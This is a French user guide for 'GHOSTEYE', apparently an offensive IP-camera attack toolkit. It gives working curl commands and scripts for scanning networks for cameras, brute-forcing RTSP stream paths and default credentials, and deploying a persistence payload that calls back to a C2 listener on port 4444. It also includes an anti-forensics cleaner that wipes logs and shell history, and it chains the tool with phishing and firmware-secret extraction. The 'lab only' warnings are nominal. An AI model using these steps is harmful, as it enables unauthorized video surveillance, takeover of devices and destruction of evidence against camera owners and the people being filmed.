# 🎯 GHOSTEYE — Guide d'usage avancé

> *Le dashboard fait 80% du boulot. Ce guide couvre les 20% qui font la différence.*

---

## Table des matières

1. [Premier lancement](#premier-lancement)
2. [Scénario 1 — Audit Hikvision sur LAN](#scénario-1--audit-hikvision-sur-lan)
3. [Scénario 2 — Scan réseau massif /24](#scénario-2--scan-réseau-massif-24)
4. [Scénario 3 — Test credentials multi-marques](#scénario-3--test-credentials-multi-marques)
5. [Scénario 4 — Bruteforce RTSP paths](#scénario-4--bruteforce-rtsp-paths)
6. [Scénario 5 — Persistance simulée (lab)](#scénario-5--persistance-simulée-lab)
7. [Scénario 6 — Export rapport JSON](#scénario-6--export-rapport-json)
8. [Intégration avec d'autres outils GHOST1O1](#intégration-avec-dautres-outils-ghost1o1)
9. [Cheatsheet API](#cheatsheet-api)
10. [Keyboard shortcuts](#keyboard-shortcuts)

---

## Premier lancement

```bash
cd ~/ghosteye
python3 ghosteye_proxy.py 8082
```

**Output attendu :**
```
╔═══════════════════════════════════════════╗
║  GHOSTEYE Stream Proxy v3.0              ║
║  RTSP → HLS + ONVIF + PortScan + RTSP    ║
╠═══════════════════════════════════════════╣
║  Dashboard: http://0.0.0.0:8082         ║
║  API:      http://0.0.0.0:8082/health   ║
║  Streams:  http://0.0.0.0:8082/streams  ║
╚═══════════════════════════════════════════╝
```

**Ouvrir :** Firefox / Chrome → `http://localhost:8082`

**Status check :**
```bash
curl -s http://localhost:8082/health
# → {"status":"ok","version":"3.0","streams":0,"uptime":5}
```

---

## Scénario 1 — Audit Hikvision sur LAN

### Contexte
Tu es sur le LAN d'un client. Tu veux auditer une caméra Hikvision connue à `10.0.0.77`.

### Étape 1 — Découverte ONVIF
```bash
curl -X POST http://localhost:8082/onvif/discover \
  -H 'Content-Type: application/json' -d '{}'
```

**Output :**
```json
[
  {
    "ip": "10.0.0.77",
    "manufacturer": "Hikvision",
    "model": "DS-2CD2142FWD-I",
    "firmware": "V5.5.0 build 170123",
    "uuid": "urn:uuid:12345678-..."
  }
]
```

### Étape 2 — Probe ONVIF détaillé
```bash
curl -X POST http://localhost:8082/onvif/probe \
  -H 'Content-Type: application/json' \
  -d '{"ip":"10.0.0.77"}'
```

**Output :**
```json
{
  "ip": "10.0.0.77",
  "manufacturer": "Hikvision",
  "model": "DS-2CD2142FWD-I",
  "firmware": "V5.5.0 build 170123",
  "serial": "DS-2CD2142FWD-I20180101",
  "hardware": "IPC-B110",
  "mac": "00:40:48:XX:XX:XX"
}
```

### Étape 3 — Port scan focalisé
```bash
curl -X POST http://localhost:8082/scan/ports \
  -H 'Content-Type: application/json' \
  -d '{"target":"10.0.0.77","ports":[80,443,554,8899,8000,8080,34567,9527]}'
```

**Output :**
```json
{"results": [{"ip": "10.0.0.77", "open": [80, 554, 8899]}]}
```

→ Ports ouverts : HTTP (80), RTSP (554), Hikvision SADP (8899)

### Étape 4 — RTSP brute (55 paths)
```bash
curl -X POST http://localhost:8082/rtsp/brute \
  -H 'Content-Type: application/json' \
  -d '{"ip":"10.0.0.77"}'
```

**Output (extrait) :**
```json
{
  "valid": [
    "rtsp://10.0.0.77:554/Streaming/Channels/101",
    "rtsp://10.0.0.77:554/Streaming/Channels/102",
    "rtsp://10.0.0.77:554/h264/ch1/main/av_stream",
    "rtsp://10.0.0.77:554/h264/ch1/sub/av_stream"
  ],
  "tested": 55,
  "found": 4
}
```

### Étape 5 — Ajout du stream principal
```bash
curl -X POST http://localhost:8082/add \
  -H 'Content-Type: application/json' \
  -d '{"id":"hik_main","url":"rtsp://10.0.0.77:554/Streaming/Channels/101"}'
```

**Output :**
```json
{"status":"ok","id":"hik_main"}
```

### Étape 6 — Visualisation
Ouvre Firefox sur `http://localhost:8082`. Le stream apparaît dans le panel **Live Streams**.

### Étape 7 — Test credentials par défaut
Dans le panel **Credentials** :
- Brand : `Hikvision`
- User : `admin`
- Pass : `(vide)` ou `12345` ou `hik12345`

Clic **TEST** → si succès, la ligne devient verte et le stream s'affiche en clair.

---

## Scénario 2 — Scan réseau massif /24

### Contexte
Tu veux identifier **toutes** les caméras d'un réseau `192.168.1.0/24`.

### Étape 1 — Scan des ports caméras
```bash
curl -X POST http://localhost:8082/scan/ports \
  -H 'Content-Type: application/json' \
  -d '{
    "target": "192.168.1.0/24",
    "ports": [80, 554, 8899, 37777, 8080, 9527, 34567, 53601, 8000]
  }'
```

**Output (extrait) :**
```json
{
  "results": [
    {"ip": "192.168.1.1", "open": [80, 443]},
    {"ip": "192.168.1.77", "open": [80, 554, 8899]},
    {"ip": "192.168.1.88", "open": [80, 37777]},
    {"ip": "192.168.1.118", "open": [80, 8080]}
  ],
  "scanned": 254,
  "duration": 18.4
}
```

→ 4 devices avec ports caméras ouverts

### Étape 2 — Probe ONVIF sur chaque device
```bash
for ip in 192.168.1.77 192.168.1.88 192.168.1.118; do
  curl -X POST http://localhost:8082/onvif/probe \
    -H 'Content-Type: application/json' \
    -d "{\"ip\":\"$ip\"}"
  echo
done
```

### Étape 3 — Brute RTSP sur les caméras identifiées
```bash
for ip in 192.168.1.77 192.168.1.88 192.168.1.118; do
  curl -X POST http://localhost:8082/rtsp/brute \
    -H 'Content-Type: application/json' \
    -d "{\"ip\":\"$ip\"}" | python3 -c "import json,sys;d=json.load(sys.stdin);print(f'$ip: {len(d[\"valid\"])} paths valid')"
done
```

**Output :**
```
192.168.1.77: 4 paths valid
192.168.1.88: 3 paths valid
192.168.1.118: 2 paths valid
```

### Étape 4 — Export du rapport
```bash
# Via API
curl -s http://localhost:8082/streams | python3 -m json.tool > rapport_streams.json

# OU via le dashboard : panel Report → EXPORT JSON
```

---

## Scénario 3 — Test credentials multi-marques

### Contexte
Tu veux tester les credentials par défaut sur 15 marques connues.

### Dans le dashboard
1. Panel **Credentials**
2. Brand selector → `Hikvision`, `Dahua`, `HiSilicon`, `Foscam`, `Axis`, `Bosch`, `Vivotek`, `Arecont`, `Avigilon`, `Honeywell`, `Panasonic`, `Samsung`, `Sony`, `Canon`, `Generic OEM`
3. User / Pass pré-remplis
4. Clic **TEST** sur chaque ligne

### Via API (bulk)
```bash
# Test admin:admin sur 192.168.1.88 (Dahua typique)
curl -X POST http://localhost:8082/credentials/test \
  -H 'Content-Type: application/json' \
  -d '{
    "ip": "192.168.1.88",
    "port": 80,
    "user": "admin",
    "pass": "admin"
  }'
```

**Output :**
```json
{
  "valid": true,
  "brand": "Dahua",
  "response_time": 0.234,
  "auth_type": "digest"
}
```

### Via liste de credentials (script)
```python
import requests

targets = ["192.168.1.77", "192.168.1.88", "192.168.1.118"]
creds = [
    ("admin", ""),
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "hik12345"),
    ("root", "root"),
    ("user", "user"),
]

for ip in targets:
    for user, pwd in creds:
        r = requests.post("http://localhost:8082/credentials/test",
                          json={"ip": ip, "port": 80, "user": user, "pass": pwd})
        if r.json().get("valid"):
            print(f"✅ {ip} → {user}:{pwd}")
            break
```

---

## Scénario 4 — Bruteforce RTSP paths

### Contexte
Tu veux identifier TOUS les paths RTSP valides sur une caméra.

### Via dashboard
1. Panel **RTSP Brute**
2. IP : `10.0.0.77`
3. Clic **BRUTE FORCE**
4. Le dashboard affiche les paths valides en temps réel

### Via API
```bash
curl -X POST http://localhost:8082/rtsp/brute \
  -H 'Content-Type: application/json' \
  -d '{"ip":"10.0.0.77","port":554}'
```

**Output :**
```json
{
  "valid": [
    "rtsp://10.0.0.77:554/Streaming/Channels/101",
    "rtsp://10.0.0.77:554/Streaming/Channels/102",
    "rtsp://10.0.0.77:554/h264/ch1/main/av_stream",
    "rtsp://10.0.0.77:554/h264/ch1/sub/av_stream"
  ],
  "tested": 55,
  "found": 4,
  "duration": 12.3
}
```

### Liste des 55 paths testés (par marque)
Voir [PATHS_RTSP.md](PATHS_RTSP.md) ou [config/rtsp_paths.json](config/rtsp_paths.json)

---

## Scénario 5 — Persistance simulée (lab)

### ⚠️ UNIQUEMENT en lab personnel

### Contexte
Tu veux tester un payload de persistance sur ta propre VM.

### Étape 1 — Génération du payload
Panel **Persistence** :
- C2 IP : ton IP Kali
- C2 Port : `4444`
- Clic **GENERATE PERSIST.SH**

### Étape 2 — Le payload généré
```sh
#!/bin/sh
# GHOSTEYE Persistence v3.0 — ghost1o1
LHOST="10.0.0.42"; LPORT="4444"
PDIR="/tmp/.cache/.ghosteye"
mkdir -p "$PDIR"
# ... (watchdog, init.d, cron)
```

### Étape 3 — Déploiement (lab uniquement)
```bash
# Sur ta VM de lab
scp persist.sh root@192.168.1.250:/tmp/
ssh root@192.168.1.250
chmod +x /tmp/persist.sh && /tmp/persist.sh
```

### Étape 4 — Test
- Coupe le listener (Ctrl+C)
- Attends 5 min
- Le watchdog doit relancer automatiquement la connexion

### Étape 5 — Cleanup
Panel **Persistence** → **GENERATE CLEANER.SH** → déployer

```sh
#!/bin/sh
# GHOSTEYE Cleaner — Zero Trace
find /var/log /tmp/log -type f -exec truncate -s 0 {} \;
unset HISTFILE
rm -rf /tmp/.cache/.ghosteye
ip neigh flush all
echo "[+] CLEAN — Zero forensic trace"
```

---

## Scénario 6 — Export rapport JSON

### Via dashboard
Panel **Report** → **EXPORT JSON**

### Output type
```json
{
  "timestamp": "2026-07-05T14:32:18Z",
  "operator": "ghost1o1",
  "tool": "GHOSTEYE v3.0",
  "target": "192.168.1.0/24",
  "summary": {
    "devices_found": 4,
    "credentials_cracked": 2,
    "rtsp_paths": 9,
    "streams_active": 3,
    "exploited": 1
  },
  "devices": [
    {
      "ip": "192.168.1.77",
      "brand": "Hikvision",
      "model": "DS-2CD2142FWD-I",
      "firmware": "V5.5.0",
      "open_ports": [80, 554, 8899]
    }
  ],
  "credentials": [
    {
      "ip": "192.168.1.77",
      "user": "admin",
      "pass": "",
      "brand": "Hikvision",
      "valid": true
    }
  ],
  "rtsp_paths_valid": [
    "rtsp://192.168.1.77:554/Streaming/Channels/101"
  ],
  "exploits": [
    {
      "ip": "192.168.1.77",
      "vector": "CVE-2021-36260",
      "status": "RCE_OK"
    }
  ]
}
```

---

## Intégration avec d'autres outils GHOST1O1

### Avec `quebec-ultimate` (OSINT)
```bash
# 1. Trouve les sous-domaines
cd ~/quebec-ultimate && python3 main.py --target example.com

# 2. Identifie les IPs des caméras
grep -E "camera|cam|surveillance" results.json

# 3. Passe à ghosteye
python3 ghosteye_proxy.py 8082
curl -X POST http://localhost:8082/scan/ports \
  -H 'Content-Type: application/json' \
  -d '{"target":"CAMERA_IP","ports":[80,554,8899,37777]}'
```

### Avec `ycc365-ghost` (firmware)
```bash
# 1. Télécharge le firmware
cd ~/ycc365-ghost && python3 scanner/fetch_firmware.py --url FIRMWARE_URL

# 2. Extrais les credentials hardcodés
python3 scanner/extract_secrets.py firmware.bin

# 3. Teste sur les caméras trouvées par ghosteye
python3 ghosteye_proxy.py 8082
# → panel Credentials → entre les creds extraits
```

### Avec `phishcloner-ultimate` (formation Blue Team)
```bash
# 1. Monte un lab
cd ~/phishcloner-ultimate && python3 server.py

# 2. Lance ghosteye en parallèle pour la capture
python3 ghosteye_proxy.py 8082

# 3. Démontre à l'équipe comment un attaquant combine les deux
```

### Avec `biobypass` (formation)
```bash
# Utilise ghosteye comme démo live pendant une session biobypass
python3 ghosteye_proxy.py 8082
# → montre "voici ce qu'un attaquant voit une fois le bypass auth réussi"
```

---

## Cheatsheet API

```bash
# Health
curl -s http://localhost:8082/health

# Liste streams
curl -s http://localhost:8082/streams

# Ajout stream
curl -X POST http://localhost:8082/add \
  -H 'Content-Type: application/json' \
  -d '{"id":"cam1","url":"rtsp://10.0.0.77:554/Streaming/Channels/101"}'

# Suppression stream
curl -X DELETE http://localhost:8082/stream/cam1

# ONVIF discover
curl -X POST http://localhost:8082/onvif/discover \
  -H 'Content-Type: application/json' -d '{}'

# ONVIF probe
curl -X POST http://localhost:8082/onvif/probe \
  -H 'Content-Type: application/json' -d '{"ip":"10.0.0.77"}'

# Port scan
curl -X POST http://localhost:8082/scan/ports \
  -H 'Content-Type: application/json' \
  -d '{"target":"10.0.0.77","ports":[80,554,8899]}'

# RTSP brute
curl -X POST http://localhost:8082/rtsp/brute \
  -H 'Content-Type: application/json' \
  -d '{"ip":"10.0.0.77"}'
```

---

## Keyboard shortcuts

| Touche | Action |
|--------|--------|
| `1` - `9` | Switch entre les 9 panels |
| `L` | Load preset streams |
| `R` | Refresh all streams |
| `A` | Add stream prompt |
| `E` | Export report |
| `?` | Help overlay |

---

## 📚 Ressources

- **README** : [README.md](README.md)
- **Install** : [INSTALL.md](INSTALL.md)
- **Tutoriels GHOST1O1** : [TUTORIALS/](https://github.com/187Ghost101/ghost1o1/tree/main/tutorials)
- **Hub** : [ghost1o1](https://github.com/187Ghost101/ghost1o1)

---

*"There is no lock." — ghost1o1*
